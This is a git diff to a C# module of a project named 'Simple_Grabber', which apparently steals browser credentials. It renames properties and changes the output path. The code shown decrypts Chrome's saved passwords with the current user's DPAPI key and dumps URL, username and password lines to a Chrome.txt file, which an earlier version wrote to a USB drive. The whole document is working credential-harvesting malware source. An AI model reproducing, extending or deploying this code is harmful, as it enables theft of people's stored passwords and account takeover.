@@ -8,13 +8,13 @@ using Dapper;
 
 namespace Simple_Grabber.Modules
 {
-    public class User
+    internal class User
     {
-        public string ActionUrl { get; set; }
+        public string Action_url { get; set; }
 
-        public string UsernameValue { get; set; }
+        public string Username_value { get; set; }
 
-        public byte[] PasswordValue { get; set; }
+        public byte[] Password_value { get; set; }
     }
 
     public class Chrome
@@ -61,9 +61,9 @@ namespace Simple_Grabber.Modules
                 {
                     // Decrypt the password
 
-                    var decryptedPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(user.PasswordValue, null, DataProtectionScope.CurrentUser));
+                    var decryptedPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(user.Password_value, null, DataProtectionScope.CurrentUser));
 
-                    databaseEntries.AppendLine($"{user.ActionUrl} : {user.UsernameValue} : {decryptedPassword}");
+                    databaseEntries.AppendLine($"{user.Action_url} : {user.Username_value} : {decryptedPassword}");
                 }
             }
 
@@ -76,16 +76,11 @@ namespace Simple_Grabber.Modules
 
         // Write the entries to a file
 
-        public static void WriteToFile(string usbPath)
+        public static void WriteToFile(string path)
         {
             var databaseEntries = GetDatabaseEntries();
 
-            if (!File.Exists(usbPath + @"Data\Chrome.txt"))
-            {
-                File.Create(usbPath + @"Data\Chrome.txt");
-            }
-
-            File.WriteAllText(usbPath + @"Data\Chrome.txt", databaseEntries.ToString());    
+            File.WriteAllText(path + @"\Chrome.txt", databaseEntries.ToString());    
         }
     }
 }
